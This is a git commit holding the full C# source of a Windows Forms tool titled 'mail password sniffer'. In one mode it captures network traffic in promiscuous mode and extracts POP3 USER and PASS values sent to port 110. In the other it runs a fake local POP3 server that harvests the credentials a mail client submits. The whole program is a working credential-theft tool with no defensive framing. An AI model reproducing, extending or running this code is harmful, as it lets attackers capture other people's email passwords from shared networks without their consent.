107eb1a35abc3cd9b6b21d8d3a7e7527d5cf72bd
likehc <463259624@qq.com>
2019-01-02 20:02:28 +0800

    first commit

---
+++ pop/Form1.Designer.cs
@@ -0,0 +1,188 @@
+﻿namespace pop
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.button1 = new System.Windows.Forms.Button();
+            this.combDevice = new System.Windows.Forms.ComboBox();
+            this.dataGridView1 = new System.Windows.Forms.DataGridView();
+            this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
+            this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
+            this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
+            this.Mac_Lab = new System.Windows.Forms.Label();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.radiolocalhost = new System.Windows.Forms.RadioButton();
+            this.radio110 = new System.Windows.Forms.RadioButton();
+            ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).BeginInit();
+            this.groupBox1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
+            this.button1.Location = new System.Drawing.Point(412, 15);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(68, 36);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "开始监听";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // combDevice
+            // 
+            this.combDevice.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.combDevice.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
+            this.combDevice.FormattingEnabled = true;
+            this.combDevice.Location = new System.Drawing.Point(134, 29);
+            this.combDevice.Name = "combDevice";
+            this.combDevice.Size = new System.Drawing.Size(272, 20);
+            this.combDevice.TabIndex = 1;
+            this.combDevice.SelectedIndexChanged += new System.EventHandler(this.combDevice_SelectedIndexChanged);
+            // 
+            // dataGridView1
+            // 
+            this.dataGridView1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
+            | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.dataGridView1.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
+            this.dataGridView1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
+            this.dataGridView1.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
+            this.Column1,
+            this.Column2,
+            this.Column3});
+            this.dataGridView1.Location = new System.Drawing.Point(12, 72);
+            this.dataGridView1.Name = "dataGridView1";
+            this.dataGridView1.RowTemplate.Height = 23;
+            this.dataGridView1.Size = new System.Drawing.Size(468, 127);
+            this.dataGridView1.TabIndex = 2;
+            this.dataGridView1.CellContentClick += new System.Windows.Forms.DataGridViewCellEventHandler(this.dataGridView1_CellContentClick);
+            // 
+            // Column1
+            // 
+            this.Column1.HeaderText = "Column1";
+            this.Column1.Name = "Column1";
+            // 
+            // Column2
+            // 
+            this.Column2.HeaderText = "Column2";
+            this.Column2.Name = "Column2";
+            // 
+            // Column3
+            // 
+            this.Column3.HeaderText = "Column3";
+            this.Column3.Name = "Column3";
+            // 
+            // Mac_Lab
+            // 
+            this.Mac_Lab.AutoSize = true;
+            this.Mac_Lab.Location = new System.Drawing.Point(234, 9);
+            this.Mac_Lab.Name = "Mac_Lab";
+            this.Mac_Lab.Size = new System.Drawing.Size(65, 12);
+            this.Mac_Lab.TabIndex = 4;
+            this.Mac_Lab.Text = "请选择网卡";
+            this.Mac_Lab.Click += new System.EventHandler(this.Mac_Lab_Click);
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.radiolocalhost);
+            this.groupBox1.Controls.Add(this.radio110);
+            this.groupBox1.Font = new System.Drawing.Font("宋体", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.groupBox1.ForeColor = System.Drawing.Color.Red;
+            this.groupBox1.Location = new System.Drawing.Point(3, 3);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(125, 63);
+            this.groupBox1.TabIndex = 5;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "选择嗅探模式";
+            this.groupBox1.Enter += new System.EventHandler(this.groupBox1_Enter);
+            // 
+            // radiolocalhost
+            // 
+            this.radiolocalhost.AutoSize = true;
+            this.radiolocalhost.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.radiolocalhost.Location = new System.Drawing.Point(9, 41);
+            this.radiolocalhost.Name = "radiolocalhost";
+            this.radiolocalhost.Size = new System.Drawing.Size(88, 16);
+            this.radiolocalhost.TabIndex = 1;
+            this.radiolocalhost.TabStop = true;
+            this.radiolocalhost.Text = "伪造服务器";
+            this.radiolocalhost.UseVisualStyleBackColor = true;
+            this.radiolocalhost.CheckedChanged += new System.EventHandler(this.radiolocalhost_CheckedChanged);
+            // 
+            // radio110
+            // 
+            this.radio110.AutoSize = true;
+            this.radio110.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.radio110.Location = new System.Drawing.Point(9, 21);
+            this.radio110.Name = "radio110";
+            this.radio110.Size = new System.Drawing.Size(96, 16);
+            this.radio110.TabIndex = 0;
+            this.radio110.TabStop = true;
+            this.radio110.Text = "110端口嗅探";
+            this.radio110.UseVisualStyleBackColor = true;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(492, 211);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.Mac_Lab);
+            this.Controls.Add(this.dataGridView1);
+            this.Controls.Add(this.combDevice);
+            this.Controls.Add(this.button1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "邮件密码嗅探";
+            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).EndInit();
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.ComboBox combDevice;
+        private System.Windows.Forms.DataGridView dataGridView1;
+        private System.Windows.Forms.Label Mac_Lab;
+        private System.Windows.Forms.DataGridViewTextBoxColumn Column1;
+        private System.Windows.Forms.DataGridViewTextBoxColumn Column2;
+        private System.Windows.Forms.DataGridViewTextBoxColumn Column3;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.RadioButton radiolocalhost;
+        private System.Windows.Forms.RadioButton radio110;
+    }
+}
+
---
+++ pop/Form1.cs
@@ -0,0 +1,275 @@
+﻿using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+using SharpPcap;
+using SharpPcap.LibPcap;
+
+namespace pop
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = false;
+            InitializeComponent();
+        }
+        string userName = string.Empty;
+        CaptureDeviceList devices = CaptureDeviceList.Instance;
+        private ICaptureDevice device;
+        private void getAdapter()//获取网卡 
+        {
+            var devices = LibPcapLiveDeviceList.Instance;
+            //var devices = WinPcapDeviceList.Instance;
+            //var devices = CaptureDeviceList.Instance;
+            if (devices.Count < 1)
+                MessageBox.Show("此设备上没有网卡");
+            else
+                foreach (var dev in devices)
+                {
+                    combDevice.Items.Add(dev.Interface.FriendlyName);
+                    combDevice.SelectedIndex = 0;
+                }
+        }
+        private string HexArrToAscii(byte[] s)
+        {
+            StringBuilder sb = new StringBuilder();
+            foreach (byte b in s)
+            {
+                char c = (char) b;
+                if (!char.IsControl(c))
+                {
+                    sb.Append(c);
+                }
+                else
+                {
+                    sb.Append('.');
+                }
+            }
+            return sb.ToString();
+        }
+        private  void device_OnPacketArrival(object sender, CaptureEventArgs e)
+        {
+            var pData = e.Packet.Data;
+            if (pData.Length >= 37)
+            {
+                if (pData[37] != 110)   //如果不是110 端口,则不记录
+                {
+                     return;
+                }
+            }
+            string hexStr = HexArrToAscii(pData);
+            char[] packetArr = hexStr.ToCharArray();
+            if (packetArr.Length >= 54)
+            {
+                for (int i = 0; i < packetArr.Length - 2; i++)
+                {
+                    if (packetArr[i] == 'U' && packetArr[i + 1] == 'S' && packetArr[i + 2] == 'E' && packetArr[i + 3] == 'R')
+                    {
+                        int passLength = packetArr.Length - i - 3 - 2; //i + 3长度是数据包头，2长度是控制符
+                        char[] userArr = new char[passLength];
+
+                        for (int j = 0; j < passLength - 2; j++)
+                        {
+                            userArr[j] = packetArr[i + 3 + j + 2];
+                        }
+                        string resultPass = new string(userArr);
+                        userName = resultPass;
+                    }
+                }
+            }
+            if (!string.IsNullOrEmpty(userName) && packetArr.Length >= 57) 
+            {
+                for (int i = 0; i < packetArr.Length - 2; i++)
+                {
+                    if (packetArr[i] == 'P' && packetArr[i + 1] == 'A' && packetArr[i + 2] == 'S' && packetArr[i + 3] == 'S')
+                    {
+                        int passLength = packetArr.Length - i - 3 - 2;//i + 3长度是数据包头，2长度是控制符
+                        char[] passArr = new char[passLength];
+
+                        for (int j = 0; j < passLength - 2; j++)
+                        {
+                            passArr[j] = packetArr[i+3 + j+2];
+                        }
+                        string resultPass = new string(passArr);
+                        InsertGridView( userName, resultPass);
+                        userName = string.Empty;
+                    }
+                }
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (button1.Text == "停止监听")
+            {
+                if (device !=null)
+                {
+                    if (device.Started)
+                    {
+                        device.StopCapture();
+                        device.Close();
+                    }
+                }
+               
+                button1.Text = "开始监听";
+                radio110.Enabled = true;
+                radiolocalhost.Enabled = true;
+                combDevice.Enabled = true;
+                return;
+            }
+            dataGridView1.Rows.Clear();
+            radio110.Enabled = false;
+            radiolocalhost.Enabled = false;
+            combDevice.Enabled = false;
+            if (radio110.Checked == true)
+            {
+                int devId = this.combDevice.SelectedIndex;
+                if (devId > -1)
+                {
+                    devices = CaptureDeviceList.Instance;
+                    device = devices[devId];
+                    device.OnPacketArrival += new SharpPcap.PacketArrivalEventHandler(device_OnPacketArrival);
+                    int readTimeoutMilliseconds = 1000;
+                    device.Open(DeviceMode.Promiscuous, readTimeoutMilliseconds);
+                    device.StartCapture();
+                    button1.Text = "停止监听";
+                }
+                else
+                {
+                    MessageBox.Show(this, "请选择一个设备", "提示", MessageBoxButtons.OK);
+                }
+            }
+            if (radiolocalhost.Checked == true)
+            {
+                button1.Text = "停止监听";
+                Thread t = new Thread(LocalhostMode);
+                t.IsBackground = true;
+                t.Start();
+            }
+        }
+
+        private IPEndPoint ipEndPoint;
+        private TcpListener tcpServer;
+        private void LocalhostMode()
+        {
+            try
+            {
+                if (ipEndPoint ==null)
+                {
+                    ipEndPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 110);
+                }
+                if (tcpServer ==null)
+                {
+                    tcpServer = new TcpListener(ipEndPoint);
+                }
+                tcpServer.Start();
+                TcpClient tcpClient = tcpServer.AcceptTcpClient();
+                NetworkStream ns = tcpClient.GetStream();
+                byte[] outbytes = Encoding.ASCII.GetBytes("+OK Welcome" + Environment.NewLine);
+                ns.Write(outbytes, 0, outbytes.Length);
+                byte[] userBytes = new byte[255];//密码
+                ns.Read(userBytes, 0, userBytes.Length);
+                string capa = Encoding.ASCII.GetString(userBytes);
+                if (capa.IndexOf("CAPA") >= 0)
+                {
+                    byte[] capaByteArr = Encoding.ASCII.GetBytes("0" + Environment.NewLine);
+                    ns.Write(capaByteArr, 0, capaByteArr.Length);
+                    ns.Read(userBytes, 0, userBytes.Length);
+                }
+                outbytes = Encoding.ASCII.GetBytes("+OK" + Environment.NewLine);
+                ns.Write(outbytes, 0, outbytes.Length);
+                byte[] pwdBytes = new byte[255];
+                ns.Read(pwdBytes, 0, pwdBytes.Length);
+                string user = Encoding.ASCII.GetString(userBytes).Replace("USER", "").Replace("\r\n", "").Replace("\0", "");
+                string pass = Encoding.ASCII.GetString(pwdBytes).Replace("PASS", "").Replace("\r\n", "").Replace("\0", "");
+                tcpClient.Close();
+                InsertGridView(user, pass);
+                button1.Text = "开始监听";
+                radio110.Enabled = true;
+                radiolocalhost.Enabled = true;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            }
+        }
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            radio110.Checked = true;    //默认监听110端口
+            ChageListenMode();
+            getAdapter();
+            dataGridView1.Columns[0].HeaderText = "时间";
+            dataGridView1.Columns[1].HeaderText = "用户名";
+            dataGridView1.Columns[2].HeaderText = "密码";
+
+        }
+
+        private delegate void InvokeHandler();  //事件委托，防止修改ui假死
+        private void InsertGridView(string user,string pass)
+        {
+            string time = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+            this.Invoke(new InvokeHandler(delegate()
+            {
+                dataGridView1.Rows.Add(time, user, pass);
+            }));
+        }
+
+        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            //释放资源
+            try
+            {
+                device.StopCapture();
+                device.Close();
+            }
+            catch 
+            {
+                
+            }
+            finally
+            {
+                this.Dispose();
+                this.Close();
+            }
+        }
+
+        private void ChageListenMode()
+        {
+            if (radio110.Checked == true)
+            {
+                combDevice.Enabled = true;
+            }
+            else
+            {
+                combDevice.Enabled = false;
+            }
+        }
+        private void radiolocalhost_CheckedChanged(object sender, EventArgs e)
+        {
+            ChageListenMode();
+        }
+
+        private void Mac_Lab_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
+        {
+
+        }
+
+        private void combDevice_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void groupBox1_Enter(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
